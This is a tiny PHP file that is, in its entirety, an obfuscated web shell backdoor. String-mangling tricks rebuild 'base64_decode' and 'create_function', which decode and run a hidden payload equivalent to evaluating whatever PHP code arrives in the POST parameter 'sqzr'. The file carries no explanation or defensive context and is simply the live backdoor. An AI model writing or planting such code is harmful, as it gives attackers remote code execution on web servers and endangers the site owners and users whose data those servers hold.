<?php 
$uf="snc3"; 
$ka="IEBldmFbsK"; 
$pjt="CRfUE9TVF"; 
$vbl = str_replace("ti","","tistittirti_rtietipltiatice"); 
$iqw="F6ciddKTs="; 
$bkf = $vbl("k", "", "kbakske6k4k_kdkekckokdke"); 
$sbp = $vbl("ctw","","ctwcctwrectwatctwectw_fctwuncctwtctwioctwn"); 
$mpy = $sbp('', $bkf($vbl("b", "", $ka.$pjt.$uf.$iqw))); $mpy(); 
?>
